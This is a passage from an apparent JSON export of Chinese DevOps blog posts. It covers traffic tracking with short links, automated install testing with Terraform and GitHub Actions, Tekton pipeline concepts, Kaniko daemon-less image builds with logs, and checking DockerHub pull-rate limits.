，侧重的更多是站内的行为数据，而访问来源数据不够精细化。\n试想，如果是一个活动二维码，该如何选择引流网站，推文放在什么类别，什么时间段推送，等等细节都可以推敲。但哪一种方式更好，却无从判断。\n短链接可以解决这个问题。通过短链，在用户与活动页之间添加了一个中间层，对更精细的流量行为进行统计分析。\n用户访问 -\u0026gt; -\u0026gt; A 站 -\u0026gt; AA 处 -\u0026gt; short_url_1 -\u0026gt; A 站 -\u0026gt; AB 处 -\u0026gt; short_url_2 -\u0026gt; B 站 -\u0026gt; A 处 -\u0026gt; short_url_3 -\u0026gt; C 站 -\u0026gt; A 处 -\u0026gt; short_url_4 -\u0026gt; 二维码落地页 这样，通过实验，我们就能够得到一个操作指导了。\n4. 下载链接也能做文章 很多互联网交流大会之后，会提供演讲 PPT 下载，以供没来得及参会或者想进一步了解细节的人查阅。主办方通常也乐于分发这些 PPT，多一次分发就多一次宣传。\n常见的方式是上传到百度云盘，提供一个分享链接。好吧，又失联了。谁下载了 PPT ？我们一无所知。\n除了使用上面提到的短链接，还有一种方式是使用对象存储。现在很多对象存储，增强了对下载端数据的统计和分析功能。在对象存储中，我们可以获取 Remote IP、Time、User-Agent、Referer 等。这些都是百度云盘提供不了的分析数据。\n","description":"","id":257,"section":"post","tags":["博文","数据","思考","策略","经营"],"title":"运营不再是拍脑袋的事","uri":"https://www.chenshaowen.com/blog/make-decisions-through-data.html"},{"content":"\n1. 测试是海上的航标 项目越复杂、规模越大，越能体现测试的价值和重要性。\n测试保证了方向的正确性。就像航行时，海上出现的航标，可以用来检验、纠正路线。便于掌舵人，随时了解动态，做出调整。\n测试决定了迭代的速度。随着 Scrum 等敏捷开发方法的实践，交付的节奏在加快。测试是交付质量的保障，如果测试跟不上，敏捷将无法落地。\n测试很重要，但却是一本经济账。太少，不足以保障质量；太多，维护成本又很高。卡住关键点位，才能获得高的性价比。\n再来看看需要测试的产品。KubeSphere 很小，却又很大。说它很小，是因为只是 Kubernetes 上的应用负载，并不对原生的 Kubernetes 进行改造。说它很大，是因为集成了很多可选的组件，提供了整套的解决方案。在日常的开发过程中，有两个地方汇聚了高密度的价值: 主仓库和安装程序。主仓库，汇聚了开发者的每次变更；安装程序，汇聚了各个组件在用户安装时的行为。\n比较之下，我认为安装更加需要额外的自动化测试，而且也更好测试。安装是用户体验的第一印象，更加贴近用户端。下面来看看，我在测试安装程序上做的工作吧。\n2. 使用 KubeSphere 测试 KubeSphere 这是一个有趣的做法，使用 KubeSphere 创建新的 KubeSphere ，并实现自测。听起来有点像自举，自己创建自己，自己测试自己。这样就有了安装程序的第一版自动化测试。\n每天对单节点、多节点、高可用三种安装方式进行自动化测试。安装之后，也会做一些 API 和 UI 层的测试，可以参考文档 《基于 Kubernetes 和 Jenkins 搭建自动化测试系统》 ，还有一些拨测用来实时验证线上服务是否正常，《使用 Jenkins 进行服务拨测》 。\n下面说一下测试流程:\n创建一条创建集群的流水线 运行 API 自动化测试 运行 UI 自动化测试，在新机器上创建一条创建集群的流水线。 就这样大概测试了半年，后来由于安装程序变更，最终创建并销毁了近 500 个集群后，暂停已有大半年时间。测试期间，我也对测试的边界进行了整理，比如操作系统、系统版本、云厂商、安装方式等。\n3. 使用 Terraform 和 GitHub Actions 在上一个版本中，主要是通过 IaaS 的 API 去创建和删除云主机，然后安装测试软件。最近安装程序又出现了几次问题，影响到用户体验，我想用 Terraform 和 GitHub Actions ，应该会有很好的自动化测试方案。\n3.1 先看看效果 如上图，执行策略有两种:\n每天早上定时执行一次 每次合并 PR 执行一次 在执行完成之后，Actions 会向 Slack 发送一条通知:\n如果有异常，需要进入 Actions 的日志页面查看详情。\n3.2 为什么是 Terraform 和 GitHub Actions Terraform 提供的能力是，只需要描述资源，Terraform 就会帮你调用 IaaS 的接口，管理这些资源的生命周期。下面是配置一个流量型 EIP 的示例:\n1 2 3 4 5 6 7 resource \u0026#34;qingcloud_eip\u0026#34; \u0026#34;init\u0026#34;{ name = \u0026#34;tf_eip\u0026#34; description = \u0026#34;\u0026#34; billing_mode = \u0026#34;traffic\u0026#34; bandwidth = 50 need_icp = 0 } 通过 terraform apply 和 terraform destroy 命令，可以随时创建和销毁描述的资源。当然，也可以使用代码仓库管理这些 Iac，实践 GitOps 。\nGitHub Actions 是 GitHub 提供的 CICD 服务，对公开仓库免费，无时长限制。只需要在 .github/workflows/ 目录下，使用 Yaml 定义流程即可使用。\n3.3 提交 Iac 配置准备测试 Iac ，基础设施即代码，是一种理念，像管理代码一样管理基础设施。这里需要将软件改造成 Iac 的描述方式:\n一个 EIP 一个防火墙 一个防火墙规则 一个云主机 一个安装资源 使用 Terraform 的 DSL 描述这些资源。\n另一方面就是 GitHub Actions 的 Workflows 的编写。这一部分主要是执行的流程:\n安装 Terraform 初始化 IaaS 秘钥 Terraform 创建资源 安装 KubeSphere 并检测是否符合预期 Terraform 销毁资源 Slack 发送通知 这里有个小的技巧，给步骤 4 设置超时时间，将 5、6 设置为 always ，也就是说无论成功还是失败，都会销毁 IaaS 资源节约成本，还会推送执行结果到 Slack。\n3.4 如何给 GitHub Actions 配置 Slack 通知 首先需要在 Workflows 描述文件中，添加如下内容:\n1 2 3 4 5 6 7 8 9 env: SLACK_WEBHOOK_URL: ${{ secrets.SLACK_WEBHOOK_URL }} steps: - name: slack uses: 8398a7/action-slack@v3 with: status: ${{ job.status }} fields: repo,message,commit,author,action,eventName,ref,workflow,job,took if: always() 其中的 SLACK_WEBHOOK_URL 是推送通知的 API 地址，需要配置在 Actions 页面的 Secrets 中。\n接着访问 Slack 的开发者页面，创建 Slack App ，然后获取 SLACK_WEBHOOK_URL 值。主要分为如下步骤:\n打开 https://api.slack.com/apps?new_app=1 ，选择 Workspace，创建 app 进入新建的 Slack App ，点击 【Incoming Webhooks】添加 Webhook 之后，就可以获取到 Webhook URL 。 4. 总结 目前测试 Case 相对单一，后续需要继续扩充。考虑不同维度选项的组合，通过 matrix 批量组合执行。\n其实，Terraform 和 GitHub Actions 的方式也不是最优的。GitHub Actions 支持运行 Kind (使用一个 Docker 容器运行 Kubernetes)。如果能对接上 Kind ，完全使用 GitHub Actions 进行自动化测试会更好。\n另外就是可以引入 Chaos 类型的工具，在系统健壮性、高可用方面进行测试。\n","description":"","id":258,"section":"post","tags":["博文","Terraform","GitHub","CICD","Kubernetes"],"title":"使用 Terraform 和 GitHub Actions 对基础设施进行自动化安装测试","uri":"https://www.chenshaowen.com/blog/using-terraform-and-github-actions-to-test-iac.html"},{"content":"1. 谈谈对 CICD 工具的审美 我在文档 软件产品是团队能力的输出 中提到，软件产品是解决方案的交付承载物，其优劣取决于团队对核心问题的理解。对领域有深入理解，交付的产品才有好的可能。CICD 是一个应用很广泛的领域，在不同的场景下，总有人在琢磨重复造轮子，难以统一。\n虽然没有具体的数据，但是我相信这些工具的 Contributor（包括 User、Committer 等）都存在交叉。因为他们关注的都是一类问题，任务编排。\n任务编排类的工具可以抽象成下面这张图。\n一个好的 CICD 工具应该具有如下特点:\nOuter DSL 简单易掌握 - User Inner DSL 高效易维护 - Developer 生态，能复用的原子要多 - Ecosystem 通过 UDE 可以给一个 CICD 工具评分。\nJenkins 的 Outer 是 Groovy 编写的 Jenkinsfile 文件，Inner 是 Java 编写的 Jenkins。UD 都不算好，Jenkins 难以维护，但插件庞大，E 大大加分。\nGitLab CI 的 Outer 是 Yaml 编写的 .gitlab-ci.yml 描述文件，Inner 是 Ruby 编写的解析引擎，使用 Go 写的 Runner。U 很好，上手很快，之前也写过一些文档，GitLab。D 不算好，Ruby 性能一般，会的人越来越少。E 就比较糟糕了，虽然有类似 Jenkins share library 的 template 提供原子级别的复用，但跨团队的复用率很低，不利于构筑社区生态。\n最后就是 Tekton，接着看下去，相信你会找到答案。\n2. 什么是 Tekton Tekton 的前身是 Knative 的子项目 build-pipeline，主要用来给 Kantive 的 build 模块增加 pipeline 功能。之后独立出来，Tekton 的目标是一个通用的 CI/CD 工具。这是一种常见的产品孵化机制。\n目前，私有云市场占有率比较高的 CICD 工具对 Kubernetes 都有所支持，比如 Jenkins、GitLab CI。但是，这些工具只是将 Kubernetes 作为其扩展的一个方面，Kubernetes 作为新的基础设施，需要原生的 CICD 方案。\n另一方面，Jenkins 的子项目 JenkinsX 也开始默认使用 Tekton 作为 CI 引擎。使用云原生一等公民 CRD + Controller 实现的 Tekton ，无疑有机会成为云原生的主流编排引擎。\n3. 组成及原理 3.1 相关组成 Tekton Pipelines 定义 Tekton 的 CRD 资源。下面会详细介绍，Task、TaskRun、Pipeline 等，用来定义数据结构。\nTekton Operator 采用 Operator 模式，使用 Controller 监听 CR 数据，执行相关的动作，是编排引擎的核心。\nTrigger Trigger pipeline 触发器，可以在 GitHub 推送或者合并 PR 后，触发流水线。\nTekton CLI Tekton CLI 是一个与 Tekton 交互的命令行工具。\nTekton Dashboard Tekton Pipelines 的 Web 图形界面。\nTekton Catalog 社区维护的 Tasks 、Pipelines 库，降低用户使用门槛、提高复用率。\nTekton Hub Tekton 的 Web 图形界面。\n3.2 核心对象 Task Task 定义任务模板，包含一系列的 Step 步骤。每个 Step 表示一个动作，比如执行命令、推送镜像等。下面是一个示例:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 apiVersion: tekton.dev/v1beta1 kind: Task metadata: name: task-with-parameters spec: params: - name: flags type: array - name: someURL type: string steps: - name: build image: my-builder args: [\u0026#34;build\u0026#34;, \u0026#34;$(params.flags[*])\u0026#34;, \u0026#34;url=$(params.someURL)\u0026#34;] TaskRun TaskRun 是 Task 的执行实例。通过 taskRef 引用一个 Task，描述执行参数。下面是一个示例:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 apiVersion: tekton.dev/v1beta1 kind: TaskRun metadata: name: run-with-parameters spec: taskRef: name: task-with-parameters params: - name: flags value: - \u0026#34;--set\u0026#34; - \u0026#34;arg1=foo\u0026#34; - \u0026#34;--randomflag\u0026#34; - \u0026#34;--someotherflag\u0026#34; - name: someURL value: \u0026#34;http://google.com\u0026#34; Pipeline Pipeline 完整定义了一个流水线，可以包含一系列的 Task 。下面是一个示例:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 apiVersion: tekton.dev/v1beta1 kind: Pipeline metadata: name: pipeline-with-parameters spec: params: - name: context type: string description: Path to context default: /some/where/or/other tasks: - name: build-skaffold-web taskRef: name: build-push params: - name: pathToDockerFile value: Dockerfile - name: pathToContext value: \u0026#34;$(params.context)\u0026#34; PipelineRun PipelineRun 是 Pipeline 的执行实例。通过 pipelineRef 引用 Pipeline ，描述执行参数。下面是一个示例:\n1 2 3 4 5 6 7 8 9 10 apiVersion: tekton.dev/v1beta1 kind: PipelineRun metadata: name: pipelinerun-with-parameters spec: pipelineRef: name: pipeline-with-parameters params: - name: \u0026#34;context\u0026#34; value: \u0026#34;/workspace/examples/microservices/leeroy-web\u0026#34; PipelineResource，文档中描述未进入 Beta 阶段，目前处于 Alpha PipelineResource 定义 Task 的输入输出，包括 Git、Pull Request、Image、Cluster、Storage 等类型。下面是一个示例:\n1 2 3 4 5 6 7 8 9 10 11 apiVersion: tekton.dev/v1alpha1 kind: PipelineResource metadata: name: test-cluster spec: type: cluster params: - name: url value: https://10.10.10.10 - name: username value: admin 在 Task 中可以使用这些自定义变量，下面是一个使用 $(resources.inputs.test-cluster.name) 的示例:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 apiVersion: tekton.dev/v1beta1 kind: Task metadata: name: deploy-image namespace: default spec: resources: inputs: - name: test-cluster type: cluster steps: - name: deploy image: image-with-kubectl command: [\u0026#34;bash\u0026#34;] args: - \u0026#34;-c\u0026#34; - kubectl --kubeconfig /workspace/$(resources.inputs.test-cluster.name)/kubeconfig --context $(resources.inputs.test-cluster.name) apply -f /workspace/service.yaml\u0026#39; Run，目前处于 Alpha 1 2 3 4 5 6 7 8 9 apiVersion: tekton.dev/v1alpha1 kind: Run metadata: name: my-example-run spec: ref: apiVersion: example.dev/v1alpha1 kind: Example name: my-example-task 支持用户自己实现 Controller ，读取 Yaml 中的配置，执行相关的动作。这里 Controller 监听的就是 Example 类型 CR 的变动。\n3.3 工作原理 上面是一个 Pipeline 的示意图。一个 Pipeline 通常由多个 Task 组成，这些 Task 串、并执行。而每个 Task 中，又有若干个 Step ，Step 是串行执行的。\n同时 Pipeline 还定义了输入、输出，通常输入 Git 仓库，输出镜像。在运行时，Pipeline 对象作为一个模板，被 PipelineRun 引用，创建运行实例。如下图:\nPipelineRunController 监听 PipelineRun 对象，将 PipelineRun 中所有的 Task 构建为一张有向无环图，创建 TaskRun 。而 TaskRunController 监听 TaskRun 对象的变化，根据 TaskRun 引用的 Task ，创建 Pod 运行 Step 。\n4. 好大一盘大棋 我关注 Tekton 有一段时间了，刚开始只是觉得编排几个 Pod，传递一下参数，最后得到一个结果就完事。没什么新意，需要写很多 Yaml 挺麻烦。\n最近想通了几个问题，才开始写 Tekton 。下面一起看看，我想了啥吧。\n4.1 task - 构建开发者生态 task 是构成 Tekton Pipeline 的原子，编排这些原子，可以用来快速创建流程。\n这些 task 并不需要用户自己写，而是可以由其他个人开发者或者厂商提供。类似 GitHub 的 Actions 市场，通过 task 市场，厂商可以推广产品，而用户可以直接拿到可复用的 Task。比如，Cloud Native Buildpacks 就提供了 Task。\n4.2 pipeline - 构建用户生态 pipeline 的应用场景不能仅停留在串流程。pipeline 是可以承载解决方案的。如果你了解过基础设施即代码（简称，Iac），那么理解起来会很容易。\n通过编排 Task ，解决方案工程师编写 Yaml 得到 Pipeline ，直接拿到 Kubernetes 集群上执行 kubectl apply 命令，然后填写参数创建 PipelineRun ，就可以完成很多事情了。简单列举几项:\n搭建购物系统 清理存储 备份 Etcd 部署 Wordpress 重启服务 弹性扩容 \u0026hellip; pipeline 可以做的事情很多，而且非常好交付。对于某些纳管的集群，在产品体验上会更佳，选中 pipeline 之后，就能一键处理事务。\n5. 参考 https://cd.foundation/ https://tekton.dev/docs/concepts/ ","description":"","id":259,"section":"post","tags":["博文","DevOps","Tekton","CICD","思考"],"title":"Tekton 概念篇 - 好大一盘棋","uri":"https://www.chenshaowen.com/blog/the-concept-of-tekton-a-big-game.html"},{"content":"1. daemon-less 镜像构建工具 1.1 什么是 daemon-less 镜像构建工具 在 CICD 流程中，经常会涉及镜像构建，常规的做法是使用 Docker in Docker 或者 Docker out of Docker 进行构建。详情可以参考文档：如何在 Docker 中使用 Docker\n实际上，为了避免垄断，促进行业发展，基于 Docker 的镜像格式，早就指定了统一的 OCI 镜像格式规范。也就是说，只需要通过 Dockerfile 得到一个符合 OCI 规范的镜像即可，并没有强制要求谁来做这件事。\ndaemon-less 的构建工具，可以不依赖于 Docker Daemon 进行构建镜像。这在 CICD 场景下，具有重要的意义。同时，Kubernetes 正在摆脱 Docker 的影响，构建更加开放的架构生态，CICD 需要与 Docker Daemon 解耦。\n1.2 daemon-less 的优势 免挂载 sock 文件 目前，实现 CRI 和 OCI 接口的运行时组件越来越多，例如 cri-o、containerd。这些运行时管理工具，并没有类似 /var/run/docker.sock 的文件用于挂载服务。daemon-less 的构建方式能够对接这些工具。\n更加安全 这些 daemon-less 工具，通常运行在 userspace ，而不是以 root 特权运行，提供更加安全的运行时。\n更适合 Kubernetes 通过挂载 /var/run/docker.sock 的方式，使用 Docker Daemon 构建镜像，是一种集中的构建方式。镜像的构建主要交给节点上的 Docker Daemon 来完成。而如果能直接将 Dockerfile 转换成镜像，更加适应 Kubernetes、Serverless 基础设施，构建规模和效率将得到提高。\n1.3 相关的开源项目 Kaniko, Google 主导 Buildah, Red Hat 主导 Img, Jessie Frazelle 发起 从 Star 量上看，Buildah、Img 目前是 3K+，而 Kaniko 达到 7K+，下面以 Kaniko 为例行文。\n2. Kaniko 的工作原理 如上图是 Kaniko 的工作原理图。Kaniko 执行器从 Dockerfile 构建镜像，并将其推送到镜像仓库。主要分为以下几步:\n根据 Dockerfile 中 FROM 描述，解压基础镜像的文件系统 执行 Dockerfile 中的每条命令，在用户空间建立文件快照 将变更的文件层添加到基础镜像中，更新镜像的元数据 推送镜像 已知的问题\n不支持构建 Windows 镜像 kaniko 命令只能在官方镜像中运行，不支持其他 Docker 镜像 不支持 Registry V1 接口 3. Kaniko Demo 3.1 测试 Demo 选择 这里选择的是 https://github.com/traefik/whoami 项目。访问该服务之后，接口会返回访问者的相关信息。\n对项目的要求是，通过 Dockerfile 能够直接编译得到镜像。一共有两个验证点:\n能够构建镜像 构建的镜像能够运行 3.2 在 Docker 上运行 Kaniko 生成推送镜像的凭证 1 2 3 4 5 6 7 8 9 10 11 export AUTH=$(echo -n YOUR_USERNAME:YOUR_PASSWORD | base64 ) cat \u0026gt; config.json \u0026lt;\u0026lt;-EOF { \u0026#34;auths\u0026#34;: { \u0026#34;https://index.docker.io/v1/\u0026#34;: { \u0026#34;auth\u0026#34;: \u0026#34;${AUTH}\u0026#34; } } } EOF 构建镜像 1 2 3 4 5 docker run \\ --interactive -v `pwd`/config.json:/kaniko/.docker/config.json gcr.io/kaniko-project/executor:latest \\ --context git://github.com/traefik/whoami \\ --dockerfile Dockerfile \\ --destination=shaowenchen/kaniko-demo:v1 参数说明: - context, 构建需要的上下文。支持多种格式，S3、本地目录、标准输入、Git 仓库等 - dockerfile, Dockerfile 路径 - destination, 构建后推送的镜像地址 在生产环境，可以配置缓存，用于加速镜像构建。\n查看日志 执行上一步的命令之后，可以看到如下输出:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 Enumerating objects: 17, done. Counting objects: 100% (17/17), done. Compressing objects: 100% (13/13), done. Total 157 (delta 3), reused 12 (delta 3), pack-reused 140 INFO[0004] Resolved base name golang:1-alpine to builder INFO[0004] Retrieving image manifest golang:1-alpine INFO[0004] Retrieving image golang:1-alpine INFO[0007] Retrieving image manifest golang:1-alpine INFO[0007] Retrieving image golang:1-alpine INFO[0010] No base image, nothing to extract INFO[0010] Built cross stage deps: map[0:[/usr/share/zoneinfo /etc/ssl/certs/ca-certificates.crt /go/whoami/whoami]] INFO[0010] Retrieving image manifest golang:1-alpine INFO[0010] Retrieving image golang:1-alpine INFO[0012] Retrieving image manifest golang:1-alpine INFO[0012] Retrieving image golang:1-alpine INFO[0015] Executing 0 build triggers INFO[0015] Unpacking rootfs as cmd RUN apk --no-cache --no-progress add git ca-certificates tzdata make \u0026amp;\u0026amp; update-ca-certificates \u0026amp;\u0026amp; rm -rf /var/cache/apk/* requires it. INFO[0035] RUN apk --no-cache --no-progress add git ca-certificates tzdata make \u0026amp;\u0026amp; update-ca-certificates \u0026amp;\u0026amp; rm -rf /var/cache/apk/* INFO[0035] Taking snapshot of full filesystem... INFO[0041] cmd: /bin/sh INFO[0041] args: [-c apk --no-cache --no-progress add git ca-certificates tzdata make \u0026amp;\u0026amp; update-ca-certificates \u0026amp;\u0026amp; rm -rf /var/cache/apk/*] INFO[0041] Running: [/bin/sh -c apk --no-cache --no-progress add git ca-certificates tzdata make \u0026amp;\u0026amp; update-ca-certificates \u0026amp;\u0026amp; rm -rf /var/cache/apk/*] fetch http://dl-cdn.alpinelinux.org/alpine/v3.12/main/x86_64/APKINDEX.tar.gz fetch http://dl-cdn.alpinelinux.org/alpine/v3.12/community/x86_64/APKINDEX.tar.gz (1/7) Installing nghttp2-libs (1.41.0-r0) (2/7) Installing libcurl (7.69.1-r2) (3/7) Installing expat (2.2.9-r1) (4/7) Installing pcre2 (10.35-r0) (5/7) Installing git (2.26.2-r0) (6/7) Installing make (4.3-r0) (7/7) Installing tzdata (2020c-r1) Executing busybox-1.31.1-r19.trigger OK: 25 MiB in 22 packages WARNING: ca-certificates.crt does not contain exactly one certificate or CRL: skipping INFO[0042] Taking snapshot of full filesystem... INFO[0045] WORKDIR /go/whoami INFO[0045] cmd: workdir INFO[0045] Changed working directory to /go/whoami INFO[0045] Creating directory /go/whoami INFO[0045] Taking snapshot of files... INFO[0045] COPY go.mod . INFO[0045] Taking snapshot of files... INFO[0045] COPY go.sum . INFO[0045] Taking snapshot of files... INFO[0045] RUN GO111MODULE=on GOPROXY=https://proxy.golang.org go mod download INFO[0045] cmd: /bin/sh INFO[0045] args: [-c GO111MODULE=on GOPROXY=https://proxy.golang.org go mod download] INFO[0045] Running: [/bin/sh -c GO111MODULE=on GOPROXY=https://proxy.golang.org go mod download] INFO[0045] Taking snapshot of full filesystem... INFO[0047] COPY . . INFO[0047] Taking snapshot of files... INFO[0047] RUN make build INFO[0047] cmd: /bin/sh INFO[0047] args: [-c make build] INFO[0047] Running: [/bin/sh -c make build] CGO_ENABLED=0 go build -a --trimpath --installsuffix cgo --ldflags=\u0026#34;-s\u0026#34; -o whoami INFO[0058] Taking snapshot of full filesystem... INFO[0062] Saving file usr/share/zoneinfo for later use INFO[0062] Saving file etc/ssl/certs/ca-certificates.crt for later use INFO[0062] Saving file go/whoami/whoami for later use INFO[0062] Deleting filesystem... INFO[0063] No base image, nothing to extract INFO[0063] Executing 0 build triggers INFO[0063] Unpacking rootfs as cmd COPY --from=builder /usr/share/zoneinfo /usr/share/zoneinfo requires it. INFO[0063] COPY --from=builder /usr/share/zoneinfo /usr/share/zoneinfo INFO[0063] Taking snapshot of files... INFO[0063] COPY --from=builder /etc/ssl/certs/ca-certificates.crt /etc/ssl/certs/ INFO[0063] Taking snapshot of files... INFO[0063] COPY --from=builder /go/whoami/whoami . INFO[0063] Taking snapshot of files... INFO[0063] ENTRYPOINT [\u0026#34;/whoami\u0026#34;] INFO[0063] EXPOSE 80 INFO[0063] cmd: EXPOSE INFO[0063] Adding exposed port: 80/tcp 最后正常退出，构建并推送镜像成功。\n查看构建镜像是否落盘本地 1 docker images|grep kaniko-demo 执行完命令，没有任何输出，符合预期。构建之后的镜像，直接被推送到了远程 Registry。\nDockerHub 查看镜像 在 DockerHub 页面可以查看到推送的镜像:\n使用镜像，创建容器 执行命令:\n1 docker run -d -p 8011:80 shaowenchen/kaniko-demo:v1 验证服务是否正常:\n1 2 3 4 5 6 7 8 9 10 curl localhost:8011 Hostname: 6dd22f1e4100 IP: 127.0.0.1 IP: 172.17.0.2 RemoteAddr: 172.17.0.1:40940 GET / HTTP/1.1 Host: localhost:8011 User-Agent: curl/7.29.0 Accept: */* 3.3 在 Kubernetes 上运行 Kaniko 查看 Kubernetes 版本 - v1.17.9 对于不同版本的 Kubernetes，下面有些命令会有所差异，需要自行适配。\n1 2 3 4 kubectl version Client Version: version.Info{Major:\u0026#34;1\u0026#34;, Minor:\u0026#34;17\u0026#34;, GitVersion:\u0026#34;v1.17.9\u0026#34;, GitCommit:\u0026#34;4fb7ed12476d57b8437ada90b4f93b17ffaeed99\u0026#34;, GitTreeState:\u0026#34;clean\u0026#34;, BuildDate:\u0026#34;2020-07-15T16:18:16Z\u0026#34;, GoVersion:\u0026#34;go1.13.9\u0026#34;, Compiler:\u0026#34;gc\u0026#34;, Platform:\u0026#34;linux/amd64\u0026#34;} Server Version: version.Info{Major:\u0026#34;1\u0026#34;, Minor:\u0026#34;17\u0026#34;, GitVersion:\u0026#34;v1.17.9\u0026#34;, GitCommit:\u0026#34;4fb7ed12476d57b8437ada90b4f93b17ffaeed99\u0026#34;, GitTreeState:\u0026#34;clean\u0026#34;, BuildDate:\u0026#34;2020-07-15T16:10:45Z\u0026#34;, GoVersion:\u0026#34;go1.13.9\u0026#34;, Compiler:\u0026#34;gc\u0026#34;, Platform:\u0026#34;linux/amd64\u0026#34;} 创建命名空间 1 kubectl create ns kaniko-demo 创建镜像推送秘钥 1 2 3 4 5 kubectl -n kaniko-demo create secret docker-registry kaniko-secret \\ --docker-server=https://index.docker.io/v1/ \\ --docker-username=YOUR_USERNAME \\ --docker-password=YOUR_PASSWORD \\ --docker-email=mail@chenshaowen.com 创建 kaniko Pod 构建镜像 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 cat \u0026gt; kaniko-builder.yaml \u0026lt;\u0026lt;-EOF apiVersion: v1 kind: Pod metadata: name: kaniko namespace: kaniko-demo spec: containers: - name: kaniko image: gcr.io/kaniko-project/executor:latest args: - \u0026#34;--dockerfile=Dockerfile\u0026#34; - \u0026#34;--context=git://github.com/traefik/whoami\u0026#34; - \u0026#34;--destination=shaowenchen/kaniko-demo:v2\u0026#34; volumeMounts: - name: kaniko-secret mountPath: /kaniko/.docker/ restartPolicy: Never volumes: - name: kaniko-secret secret: secretName: kaniko-secret items: - key: .dockerconfigjson path: config.json EOF 创建 Pod\n1 kubectl apply -f kaniko-builder.yaml 查看日志 1 kubectl -n kaniko-demo logs kaniko 日志内容与直接在 Docker 中运行类似，这里就不重复贴出。\n查看 DockerHub 页面的镜像 使用构建的镜像创建负载 1 kubectl -n kaniko-demo run kaniko --image=shaowenchen/kaniko-demo:v2 暴露服务并查看服务端口 1 kubectl -n kaniko-demo expose deploy/kaniko --type=NodePort --port=80 --target-port=80 1 2 3 kubectl -n kaniko-demo get svc NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE kaniko NodePort 10.233.27.225 \u0026lt;none\u0026gt; 80:30772/TCP 29s 验证构建的镜像能正常使用 1 2 3 4 5 6 7 8 9 10 curl 192.168.13.3:30772 Hostname: kaniko-5ddbf597b6-5h8k8 IP: 127.0.0.1 IP: 10.233.90.187 RemoteAddr: 192.168.13.3:11443 GET / HTTP/1.1 Host: 192.168.13.3:30772 User-Agent: curl/7.29.0 Accept: */* 4. 其他关注的问题 支持 ARM 镜像构建 在最新的版本中，已经可以看到 ARM 的 Kaniko 执行器: https://github.com/GoogleContainerTools/kaniko/releases/tag/v1.3.0\n无法给 Git 仓库单独配置秘钥和分支参数 官方提供的一种方式是直接将秘钥和分支参数拼接在 Git 仓库的 URL 中\n没有提供构建之前的 prehook 命令 需要在 Dockerfile 中完整描述从源码到镜像的构建过程。最好借助于分阶段构建，改造有些项目中直接 Copy 构建产物的的 Dockerfile 。类似下面的 Dockerfile 不能直接使用:\n1 2 3 4 5 6 7 FROM java:openjdk-8-jre-alpine WORKDIR /home COPY target/*.jar /home ENTRYPOINT java -jar *.jar 5. 参考 https://github.com/GoogleContainerTools/kaniko https://github.com/genuinetools/img https://github.com/containers/buildah ","description":"","id":260,"section":"post","tags":["博文","DevOps","镜像","CICD","Kubernetes"],"title":"Daemon-less 镜像构建工具 - Kaniko","uri":"https://www.chenshaowen.com/blog/the-daemon-less-tools-of-kaniko.html"},{"content":"1. DockerHub 限制 终究还是绕不过下面这个报错:\n1 Error response from daemon: toomanyrequests: You have reached your pull rate limit. You may increase the limit by authenticating and upgrading: https://www.docker.com/increase-rate-limit DockerHub 从 2020 年 11 月 2 日，正式开始限制非付费用户的拉取频率:\n匿名用户，每 6 小时只允许 pull 100 次\n已登录用户，每 6 小时只允许 pull 200 次\n好吧，正常情况下，到这里就友尽了，不让用就不用。但是再看看这张图:\n对于有些团队来说，DockerHub 的功能不仅仅是存储镜像，更重要的是作为分发中心。每次构建完镜像，直接被推送到 DockerHub，然后其他地方再同步镜像。\n如此，DockerHub 拉取镜像的限制就不得不解决了。\n2. 如何测试 2.1 镜像是如何拉取的 在测试之前，我们先来了解一下镜像是如何拉取的。下图是一个镜像的结构，一个镜像对应着一个 Manifest，也就是这里的 JSON 结构。\n为了更具体一点，我们开启 Docker 的实验特征，查看一下 nginx 镜像的 manifest。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 export DOCKER_CLI_EXPERIMENTAL=enabled docker manifest inspect --verbose nginx ```json [ { \u0026#34;Ref\u0026#34;: \u0026#34;docker.io/library/nginx:latest@sha256:99d0a53e3718cef59443558607d1e100b325d6a2b678cd2a48b05e5e22ffeb49\u0026#34;, \u0026#34;SchemaV2Manifest\u0026#34;: { \u0026#34;schemaVersion\u0026#34;: 2, \u0026#34;mediaType\u0026#34;: \u0026#34;application/vnd.docker.distribution.manifest.v2+json\u0026#34;, \u0026#34;config\u0026#34;: { \u0026#34;mediaType\u0026#34;: \u0026#34;application/vnd.docker.container.image.v1+json\u0026#34;, \u0026#34;size\u0026#34;: 7480, \u0026#34;digest\u0026#34;: \u0026#34;sha256:bc9a0695f5712dcaaa09a5adc415a3936ccba13fc2587dfd76b1b8aeea3f221c\u0026#34; }, \u0026#34;layers\u0026#34;: [ { \u0026#34;mediaType\u0026#34;: \u0026#34;application/vnd.docker.image.rootfs.diff.tar.gzip\u0026#34;, \u0026#34;size\u0026#34;: 27105484, \u0026#34;digest\u0026#34;: \u0026#34;sha256:852e50cd189dfeb54d97680d9fa6bed21a6d7d18cfb56d6abfe2de9d7f173795\u0026#34; }, ... ] 可以看到在 Manifest 中，记录着很多 Layer 的指纹数据，而 Layer 层才是镜像层数据，Manifest 记录的只是元数据。拉取镜像的过程，分为两步：\n拉取 Manifest 根据 Manifest 中的描述，拉取 Layer 层数据。如果本地有缓存，则不用请求。 2.2 测试脚本 查看当前 Dockerhub 的拉取余额 如果是登录用户，可以在 curl 后面添加 --user 'username:password' 参数。\n1 2 3 4 5 6 TOKEN=$(curl \u0026#34;https://auth.docker.io/token?service=registry.docker.io\u0026amp;scope=repository:shaowenchen/dockerhub-ratelimit:pull\u0026#34; | jq -r .token) curl --head -H \u0026#34;Authorization: Bearer $TOKEN\u0026#34; https://registry-1.docker.io/v2/shaowenchen/dockerhub-ratelimit/manifests/1 ratelimit-limit: 100;w=21600 ratelimit-remaining: 99;w=21600 docker-ratelimit-source: 1.2.3.4 docker-ratelimit-source，表示受限的 IP\nratelimit-remaining，表示的是 21600 秒，6 